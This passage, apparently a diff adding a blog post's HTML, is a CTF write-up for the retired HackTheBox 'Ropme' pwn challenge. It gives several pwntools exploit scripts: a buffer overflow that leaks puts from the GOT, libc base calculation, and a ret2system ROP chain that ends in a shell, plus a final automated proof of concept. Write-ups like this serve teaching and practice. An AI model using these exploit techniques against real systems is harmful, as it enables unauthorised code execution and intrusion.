+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ropme&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = gdb.debug(&#34;./ropme&#34;, &#34;b main&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006d3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">got_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601018</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004e0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004f0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">got_puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">plt_puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">plt_main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ROP me outside, how &#39;about dah?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="/HackTheBox-Pwn-Ropme/6.png" alt="6"></p>
+<h2 id="exploit-3">Exploit 3</h2>
+<p>To find the address of libc we can use this <code>libc = leaked_puts - libc_puts</code> which takes the puts offset and subtracts it from the leaked address</p>
+<p>We can use the following exploit to calculate the base address of libc.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Pwnage by memN0ps!!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context(terminal=[&#39;tmux&#39;, &#39;new-window&#39;])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#p = process(&#34;./ropme&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;./ropme&#34;</span><span class="p">,</span> <span class="s2">&#34;b main&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006d3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">got_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601018</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004e0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004f0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">got_puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">plt_puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">plt_main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ROP me outside, how &#39;about dah?&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Leaked puts@GLIBC_2.2.5: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_puts</span> <span class="o">=</span> <span class="mh">0x0765f0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc_puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Base address of GLIBC_2.2.5: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>After running the exploit we should see the address of libc.</p>
+<p><img src="/HackTheBox-Pwn-Ropme/7.png" alt="7"></p>
+<p>We can see that the address of libc and puts was correct using vmmap at runtime.</p>
+<p><img src="/HackTheBox-Pwn-Ropme/8.png" alt="8"></p>
+<h2 id="exploit-4">Exploit 4</h2>
+<p>Now all that is left to do is call <code>system()</code> with the <code>/bin/sh</code> argument, which will go inside <code>RDI</code>.</p>
+<p>We need to find the address of <code>/bin/sh</code> and <code>system()</code> in LIBC.</p>
+<pre tabindex="0"><code>$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system
+  1430: 0000000000048e50    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
+</code></pre><pre tabindex="0"><code>$ strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
+ 18a152 /bin/sh
+</code></pre><p>After running the exploit we should see that we have a root shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Pwnage by memN0ps!!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context(terminal=[&#39;tmux&#39;, &#39;new-window&#39;])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ropme&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#p = gdb.debug(&#34;./ropme&#34;, &#34;b main&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006d3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">got_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601018</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004e0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400626</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">got_puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">plt_puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">plt_main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ROP me outside, how &#39;about dah?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Leaked puts@GLIBC_2.2.5: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_puts</span> <span class="o">=</span> <span class="mh">0x0765f0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc_puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Base address of GLIBC_2.2.5: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh_offset</span> <span class="o">=</span> <span class="mh">0x18a152</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x048e50</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">bin_sh_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">system_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004c9</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">bin_sh</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">ret</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">system</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ROP me outside, how &#39;about dah?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>The exploit works fine locally. However, it fails remotely.</p>
+<p>Screenshot with GDB debug
+<img src="/HackTheBox-Pwn-Ropme/9.png" alt="9"></p>
+<p>Screenshot without GDB</p>
+<p><img src="/HackTheBox-Pwn-Ropme/10.png" alt="10"></p>
+<p>Shell without context.log_level=&ldquo;DEBUG&rdquo;</p>
+<p><img src="/HackTheBox-Pwn-Ropme/11.png" alt="11"></p>
+<h2 id="finding-the-remote-version-of-libc">Finding the remote version of libc</h2>
+<p>To ensure this exploit works remotely, we can use the <a href="https://github.com/niklasb/libc-database">libc database</a> <a href="https://libc.blukat.me/">https://libc.blukat.me/</a> or <a href="https://libc.rip/">https://libc.rip/</a> to find the correct libc version since we don&rsquo;t know what the target is running.</p>
+<p>We can do this by using the leaking puts on the remote target and using the libc database to calculate that.</p>
+<p>The leaked remote version for me was <code>0x7fcf93af1690</code>.</p>
+<pre tabindex="0"><code>[+] Leaked puts@GLIBC_2.2.5: 0x7fcf93af1690
+</code></pre><p>I downloaded <code>libc6_2.23-0ubuntu11_amd64</code> with the MD5 hash of <code>8c0d248ea33e6ef17b759fa5d81dda9e</code></p>
+<p><img src="/HackTheBox-Pwn-Ropme/13.png" alt="10"></p>
+<p>Note: This challenge was a bit broken and even though we got the correct version of libc and called /bin/sh, we could not get a shell until we minus 64 bytes from <code>/bin/sh</code> for some padding. This is not required in most challenges.</p>
+<p>We can use the same manual techniques and hard code the values or there is a better way.</p>
+<pre tabindex="0"><code>$ readelf -s libc6_2.23-0ubuntu11_amd64.so | grep puts
+
+186: 000000000006f690   456 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
+404: 000000000006f690   456 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+475: 000000000010bbe0  1262 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
+651: 000000000010d590   703 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
+1097: 000000000006e030   354 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
+</code></pre><pre tabindex="0"><code>$ readelf -s libc6_2.23-0ubuntu11_amd64.so | grep system
+1351: 0000000000045390    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+</code></pre><pre tabindex="0"><code>$ strings -a -t x libc6_2.23-0ubuntu11_amd64.so | grep /bin/sh
+18cd57 /bin/sh
+</code></pre><h2 id="pwntools-magic">Pwntools Magic</h2>
+<p>Pwntools is an awesome CTF framework, some of the things done above were deliberately done manually to demonstrate concepts.</p>
+<p>All of the things that were done manually can be done automatically using pwntools.</p>
+<p>I&rsquo;ve modified the exploit to find to use the remote version of libc when the argument is &ldquo;REMOTE&rdquo; else to use the local version of libc.</p>
+<p>I&rsquo;ve used the python pwntools library to automatically find rop gadgets such as <code>pop rdi; ret</code> and call the relevant functions, such as <code>puts</code> with the correct argument, <code>main</code>, calculated the version of libc at run time and call <code>system</code> with <code>/bin/sh</code> as the argument.</p>
+<h2 id="final-poc">Final PoC</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Pwnage by memN0ps!!!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context.log_level=&#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#context(terminal=[&#39;tmux&#39;, &#39;new-window&#39;])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Change IP address and port number, also download correct version of libc</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span> <span class="mi">32497</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc6_2.23-0ubuntu11_amd64.so&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ropme_only</span> <span class="o">=</span> <span class="mi">64</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ropme&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/usr/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ropme_only</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#p = gdb.debug(&#39;./ropme&#39;, &#39;b main&#39;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Mapping binaries&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropme</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;ropme&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">ropme</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 1st stage payload (ret2puts / ret2plt)</span>
+</span></span><span class="line"><span class="cl"><span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">72</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">regs</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;rdi&#39;</span><span class="p">],</span> <span class="n">order</span> <span class="o">=</span> <span class="s1">&#39;regs&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">ropme</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">ropme</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Stage 1 ROP Chain:</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Sending 1st stage payload!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ROP me outside, how &#39;about dah?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Calculate base address of libc using leaked puts</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Leaked puts@GLIBC_2.2.5: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Calculated base address of GLIBC_2.2.5: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2nd stage payload (ret2system)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop2</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop2</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="n">ropme_only</span><span class="p">)</span> <span class="c1"># - 64 only for this broken challenge</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Stage 2 ROP chain:</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">rop2</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">rop2</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Sending 1st stage payload!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;ROP me outside, how &#39;about dah?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Drop an interactive shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&#34;W00TW00T!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p><img src="/HackTheBox-Pwn-Ropme/pwnd.png" alt="11"></p>
+<p>W00TW00T we have a shell on the remote box! Hope you enjoyed my writeup :)</p>
+<p>Thanks to HackTheBox and the challenge maker @xero. Please note that this challenge is retired and writeups are permitted.</p>
+<p>Hopefully, when I get the time I can do more writeups.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://ctf101.org/binary-exploitation/overview/">https://ctf101.org/binary-exploitation/overview/</a></li>
+<li><a href="https://wargames.ret2.systems/course">https://wargames.ret2.systems/course</a></li>
+<li><a href="https://unix.stackexchange.com/questions/466443/do-memory-mapping-segment-and-heap-grow-until-they-meet-each-other">https://unix.stackexchange.com/questions/466443/do-memory-mapping-segment-and-heap-grow-until-they-meet-each-other</a></li>
+<li><a href="https://ir0nstone.gitbook.io/notes/">https://ir0nstone.gitbook.io/notes/</a></li>
+<li><a href="https://eli.thegreenplace.net/2011/02/04/where-the-top-of-the-stack-is-on-x86/">https://eli.thegreenplace.net/2011/02/04/where-the-top-of-the-stack-is-on-x86/</a></li>
